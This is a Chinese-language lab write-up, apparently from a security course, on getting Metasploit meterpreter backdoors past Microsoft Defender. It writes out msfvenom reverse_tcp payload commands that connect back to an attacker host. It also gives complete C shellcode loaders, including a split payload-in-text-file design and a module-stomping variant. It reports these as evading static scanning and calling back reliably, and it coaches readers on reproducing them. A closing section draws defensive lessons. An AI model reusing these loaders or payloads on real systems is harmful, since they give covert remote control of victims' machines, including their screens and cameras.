二、预备知识：杀软怎么“抓坏人”，免杀就怎么“见招拆招”

现代杀软（以本文的 Microsoft Defender 为例）用三层手段分层工作：

表3　杀软三层检测与免杀思路对应关系
检测层工作位置抓的是对应的免杀思路
特征码检测文件落盘/扫描时已知样本的字节指纹改变特征：编码、加密、重写、组件分离
启发式检测执行前“长得像”恶意软件（高熵加壳段、VirtualAlloc+CreateThread 组合、无签名）伪装外观、降低熵值

四、第 0/1 级对照组：msfvenom 裸 exe 与编码器变形

（一）裸 exe（第 0 级）

# -p 指定载荷：windows/meterpreter/reverse_tcp
# LHOST：回连地址（填 Kali 的 IP）；LPORT：回连端口
# -f exe：输出 Windows 可执行文件；-o：输出文件名
msfvenom -p windows/meterpreter/reverse_tcp LHOST=你的Kali_IP LPORT=443 -f exe -o 你的学号_base.exe
LHOST / LPORT 每台电脑都不一样：LHOST 填你自己 Kali 的 IP（即占位符 你的Kali_IP，用 hostname -I 查询）；LPORT 原则上任意未被占用的端口都行，本文用 443 只是借它伪装成 HTTPS 流量、更容易穿过防火墙的出站规则——你用 4444、8443 都可以，只要生成载荷、起 handler、（附加题的）端口转发三处保持一致。

编码器免杀在 2026 年已经失效。原因藏在数字里：密文完全变形了（355→760 字节），但成品 exe 的结构与体积由模板决定——AV 盯的是 shikata 的解码器 stub 与 msfvenom 的 PE 模板，与编码次数无关。

B 环境交叉验证：用 reverse_https 生成同样的三级样本，结果一致——裸 exe（payload 566 字节/exe 7680 字节）与编码 10 次版（payload 638→881 字节，exe 仍是 7680 字节）落盘即杀，同样特征 Trojan:Win32/Meterpreter.RPZ!MTB；jar（6289 字节）被隔离（VirTool:Java/Meterpreter.A）。两台机器、两种传输层、三种格式，全灭——公开工具的生成物早已是杀软特征库的一部分。

五、第 2 级：C + shellcode 半手工——把载荷藏进自己的程序

编码器失效，那就抛开 msfvenom 的 exe 模板，自己写程序：先用 msfvenom 把载荷输出成 C 语言字节数组，再自己写加载器执行。

# -f c：输出为 C 数组格式；shikata_ga_nai 编码 3 次
msfvenom -p windows/meterpreter/reverse_tcp LHOST=你的Kali_IP LPORT=443 \
  -e x86/shikata_ga_nai -i 3 -b '\x00' -f c -o shellcode.c

加载器 cs.c 的核心只有四步——申请内存 → 拷入 → 起线程执行：

unsigned char buf[] = "/* msfvenom -f c 输出的字节数组，此处省略 */";

int main(void) {
    void *execMem = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT,
                                 PAGE_EXECUTE_READWRITE);   /* ① 申请一块可执行内存（data 节默认不可执行，必须显式申请） */
    if (execMem == NULL) return 1;
    memcpy(execMem, buf, sizeof(buf));                      /* ② 把 shellcode 拷进去 */
    HANDLE thread = CreateThread(NULL, 0,
        (LPTHREAD_START_ROUTINE)execMem, NULL, 0, NULL);    /* ③ 起线程让它跑起来 */
    WaitForSingleObject(thread, INFINITE);                  /* ④ 等它执行完 */
    return 0;
}
# i686-w64-mingw32-gcc：编译出 32 位 Windows exe 的交叉编译器
i686-w64-mingw32-gcc cs.c -o 你的学号_cs.exe

扫描结果：Defender 仍检出同一特征名 Trojan:Win32/Meterpreter.RPZ!MTB（14:25）。

为什么还是死？ 藏进了自己的程序，但 shellcode 的字节本身没变——2026 年的 Defender 对 meterpreter shellcode 字节特征的识别已经成熟。只要恶意字节还完整地躺在文件里，静态查杀总有办法命中。

六、第 3 级：UPX 加壳——老牌壳也是“知名特征”

给 cs.exe 套上 UPX 壳（-o 输出成新文件，保留原版）：

upx 你的学号_cs.exe -o 你的学号_cs_upx.exe
实测坑：CantPackException: section size problem。UPX 4.2.4 直接对 msfvenom 模板生成的 exe（如 base 版）会报这个错——msf 模板的 PE 节表不规整，不满足 UPX 4.x 的检查。解决：把加壳对象换成 mingw 编译的 exe（PE 结构规整）。

加壳结果：仍被检出，而且详情里明确标注了 →(UPX)（14:28）。

为什么加壳也救不了？两个原因：① UPX 是最知名的壳，壳本身的特征早已被收录（截图里的 →(UPX) 标注就是证据）；② 加壳后的高熵数据段会触发启发式检测。

诚实备注：Veil-Evasion 我们没有做。 课件提到的这个自动化生成框架，两人都未实测——2026 版 Kali 上它依赖 wine、安装笨重、成功率低，且课件已给出实测结论：其生成物的特征同样被收录（历史检出 19/58）。相比之下，本文的手工组合路线不需要额外安装任何东西。若你的课程要求覆盖 Veil，“按课件口径评估后放弃”同样是一种有效的实测结论。

七、第 4 级（终态方案）：组件分离 + 私有加密

（一）核心思想：把恶意字节拆出去

把后门拆成两个“各自无害”的文件：

┌─────────────────┐         ┌──────────────────┐
│  encoded.txt    │         │  loader.exe      │
│  纯十六进制文本  │  运行时  │  只有通用 API 调用 │
│  （逐字节+1加密） │ ──────→ │  读文本→解密→执行  │
│  杀软眼里：普通文本│  内存中  │  杀软眼里：普通小程序│
└─────────────────┘  合体    └──────────────────┘
      两份“无害”的文件，直到运行那一刻才在内存里合体
      —— 而静态扫描只看文件，看不到内存
  • encoded.txt：载荷逐字节 +1 加密后转成十六进制文本。杀软不会对 txt 报毒，且内容已“变脸”，熵值也低（逐字节 +1 属于轻加密，不会像 AES 那样触发高熵启发式）；
  • loader.exe：只有 fopen/VirtualAlloc/memcpy/CreateThread 这类通用 API 调用，文件里不含任何载荷字节，静态扫描无特征可匹配。

（二）生成加密载荷

# ① -f raw：输出最原始的裸 shellcode（不带任何模板）

（三）加载器：最小可用版（A 的主线方案）

#include <windows.h>
#include <stdio.h>
#define MAX_LEN 4096
unsigned char buf[MAX_LEN];

int main(void) {
    FILE *fp = fopen("encoded.txt", "r");        /* ① 只读“无害”的文本，文件里没有恶意字节 */
    if (fp == NULL) return 1;
    int i = 0; unsigned int ch;
    while (i < MAX_LEN && fscanf(fp, "%2x", &ch) == 1)
        buf[i++] = (unsigned char)ch;            /* ② 两位两位读成字节 */
    fclose(fp);
    for (int j = 0; j < i; j++) buf[j] = (unsigned char)(buf[j] - 1);   /* ③ 解密：+1 的逆运算 */
    void *execMem = VirtualAlloc(NULL, i, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (execMem == NULL) return 1;
    memcpy(execMem, buf, i);
    HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)execMem, NULL, 0, NULL);
    if (!thread) return 1;
    WaitForSingleObject(thread, INFINITE);
    CloseHandle(thread); VirtualFree(execMem, 0, MEM_RELEASE);
    return 0;
}

这个版本能过静态、能回连（「运行层」一节实测成功），但它有一个行为层软肋：VirtualAlloc(PAGE_EXECUTE_READWRITE) 一次申请 RWX 私有内存，正是行为引擎重点盯防的申请模式。

实测对照，也是给你的排错提示：这套最简思路在两套环境都验证通过——静态 0 威胁、reverse_tcp 稳定回连（B 环境一次偶发运行时拦截的复测修正见「传输层辨析」一节）。如果你复刻时静态扫描过了、运行却被杀，先复测一次（行为判定有概率性）；仍被拦再试试下一小节 B 的模块踩踏版，或换传输层。

（四）进阶：模块踩踏版（B 的强化方案）

B 环境把执行方式升级为“模块踩踏”，加载器 你的学号exp.c 三个要点：

  • ① 文件里不含任何载荷字节（同上，静态无特征）；
  • ② 把解密后的代码写进已加载系统 DLL（msacm32.dll）的 .text 段再跳转——执行内存有文件映射背书，避开“私有可执行内存”这一行为特征；
  • ③ 写入用 RW、写完 VirtualProtect 改 RX，避免 RWX 一次到位的申请模式。
#include <windows.h>
#include <stdio.h>
#include <string.h>
#define MAX_LEN 4096
unsigned char buf[MAX_LEN];

static LPVOID FindTextRange(HMODULE hMod, SIZE_T need) {          // 在已加载模块里找能装下载荷的 .text 段
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hMod;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE *)hMod + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = (PIMAGE_SECTION_HEADER)
        ((BYTE *)&nt->OptionalHeader + nt->FileHeader.SizeOfOptionalHeader);
    for (int s = 0; s < nt->FileHeader.NumberOfSections; s++, sec++)
        if (!memcmp(sec->Name, ".text", 5) && sec->Misc.VirtualSize > need)
            return (LPVOID)((BYTE *)hMod + sec->VirtualAddress);
    return NULL;
}

int main(void) {
    FILE *fp = fopen("encoded.txt", "r");                          // 只读“无害”的文本
    if (fp == NULL) return 1;
    int i = 0; unsigned int ch;
    while (i < MAX_LEN && fscanf(fp, "%2x", &ch) == 1)
        buf[i++] = (unsigned char)ch;
    fclose(fp);
    if (i == 0) return 1;
    for (int j = 0; j < i; j++) buf[j] = (unsigned char)(buf[j] - 1);   // -1 解密

    HMODULE hMod = LoadLibraryA("msacm32.dll");                    // 踩踏目标：常驻但本进程不会调用
    if (hMod == NULL) return 1;
    LPVOID exec = FindTextRange(hMod, (SIZE_T)i);
    if (exec == NULL) return 1;

    DWORD old;
    if (!VirtualProtect(exec, (SIZE_T)i, PAGE_READWRITE, &old)) return 1;    // 段改 RW 写入
    memcpy(exec, buf, i);
    if (!VirtualProtect(exec, (SIZE_T)i, PAGE_EXECUTE_READ, &old)) return 1; // 再改 RX 执行
    FlushInstructionCache(GetCurrentProcess(), exec, i);

    HANDLE t = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec, NULL, 0, NULL);
    if (t == NULL) return 1;
    WaitForSingleObject(t, INFINITE);
    return 0;
}

（二）传输层辨析：一次未复现的拦截（B 补测修正）

B 环境最初的一次测试中，reverse_tcp 载荷运行时曾被 Defender 行为引擎拦截（特征名 Behavior:Win32/Meterpreter.gen!D）。当时把它归因于 reverse_tcp 的工作方式：它是分阶段载荷——先落地数百字节的 stager 建立连接，再由 stager 自行申请一块 RWX 内存、把约 200KB 的第二阶段（metsrv）收进去执行，“外连 → 自申请 RWX → 接收大段代码 → 执行”在理论上是一条显眼的行为特征链。

但后续多次复测推翻了这个归因：同样的 reverse_tcp 载荷在 B 环境反复运行，均未再出现拦截；A 环境也始终稳定。也就是说，那次拦截是一次概率性判定（云查杀特征时点、环境状态等都可能影响），既不是“tcp 必被拦”的规律，也与传输层没有必然关系。

两环境的最终实测结论一致：reverse_tcp 与 reverse_https 都能稳定回连（图18 是 B 以 reverse_https 完成的回连记录）。本文正文统一采用 reverse_tcp。给遇到拦截的读者两条经验：先复测（行为判定有概率性，本例复测即未复现）；仍被拦再尝试换传输层（https 由系统组件 WinINet/TLS 收发，行为面更小）或升级加载器（模块踩踏）：

三条核心结论：

  1. 编码器叠代与加壳都不能免杀：本实验条件下，shikata_ga_nai 叠代 10/15 次未改变 Defender 对 msfvenom 模板 exe 的检出——密文已完全变形，而成品 exe 尺寸不变，说明静态特征主要落在模板与解码存根；UPX 作为最知名的壳，特征早已收录还会叠加高熵启发式。（该结论基于单载荷、单编码器、单壳的测试，外推需谨慎。）
  2. 组件分离 + 私有加密能过静态层，且跨环境可复现：对照组全灭的同一时刻，加载器和加密文本在两套环境里都安然落盘、扫描 0 威胁。
  3. 运行层仍是真正的对手，且行为判定具有概率性：B 环境曾出现一次 reverse_tcp 运行时拦截（Behavior:Win32/Meterpreter.gen!D），但复测多次均未复现，两环境最终 tcp/https 均稳定回连——不能凭一次拦截下“必被拦”的结论。静态免杀 ≠ 运行时免杀这条底线不变，遇到拦截先复测、再换路径，防御必须纵深。

十四、原理深挖：为什么有的死、有的活

为什么基线必死。 msfvenom 的 exe/jar 都是公开模板，字面特征早已进特征库。图1 与图2 的对比证明：编码器只改变密文部分，改变不了模板和解码存根。同理，C+shellcode 藏得住结构、藏不住字节（图5）；UPX 壳本身也是公开物（图7 的 →(UPX) 标注）。

为什么组件分离能过静态层。 把恶意字节从 exe 拆出去后，装载器与数据件各自“无害”：加载器只有读文本、改内存保护、开线程这类通用 API 调用，翻遍文件无指纹；载荷在文本文件里且逐字节 +1“变脸”，对杀软只是普通文本（而且低熵，不触发启发式）。两份“无害”文件直到运行那一刻才在内存里合体——而静态扫描只看文件、看不到内存。

为什么要模块踩踏 + RW→RX。 行为引擎对“申请私有可执行内存（RWX）并执行”高度敏感。把代码写进已加载系统 DLL 的 .text 段（写时复制，只影响本进程），执行内存就有文件映射背书；先 RW 写入再改 RX，避免 RWX 一次到位的申请模式。最小可用版（VirtualAlloc RWX）能过静态但行为面更差，模块踩踏版把这条行为特征也抹掉了。

传输层与行为特征。 reverse_tcp 是分阶段载荷：stager 建立连接后自行申请 RWX 内存、把约 200KB 的第二阶段收进去执行，“外连 → 自申请 RWX → 接收大段代码 → 执行”在理论上是一条显眼的行为链；reverse_https 改用系统组件（WinINet + TLS）收发，行为面更小。但本实验的实测证据是：两环境的 reverse_tcp 均稳定回连，B 环境出现过一次拦截、复测未再复现——行为判定存在概率性，传输层不是本实验成败的决定因素。教训修正：遇到运行时拦截，先复测再归因；换传输层、模块踩踏都是可尝试的路径——免杀是载荷、加载器、传输三方的系统工程。

防御启示。静态特征只能对抗“已知生成模板”；组件分离可以骗过静态层；但运行时行为（RWX 内存、异常外连）终会暴露。对防御者而言：行为监测与纵深防御（EDR、最小权限、应用白名单）才是对抗此类威胁的根本手段；对普通用户而言：默认系统设置、及时更新特征库、不运行来源不明程序，依然是性价比最高的防线——图23/图24 里对方电脑杀软“扫描无威胁”却屏幕、摄像头尽失，就是最好的警示。

十七、写在最后

这个实验最有说服力的画面，是同一个目录、同一秒钟里发生的两件事：对照组 exe 弹窗被杀，而旁边两个“组分合体”的文件——一个纯文本、一个普通小程序——安然无恙。这说明现代杀软的静态层已经把“公开工具的生成物”收录殆尽，编码和加壳只是在已有特征上打转；有效的免杀必须改变“恶意特征存在的方式”本身。而运行层的故事（一次未复现的运行时拦截，以及 tcp/https 在两套环境双双稳定通过）则提醒所有人：行为检测是概率性的、有边界的，对抗永远不会在一层结束。

作为防御方的练习，建议读者复刻完攻击链后反过来做三件事：把 loader 交给 VT（VirusTotal）看引擎命中率、在 Defender 安全中心翻一遍“保护历史记录”体会行为引擎的判定时机、再给自己的常用电脑做一次“如果它静默回连我会不会发现”的推演——攻防视角的切换，才是这个实验最大的收获。
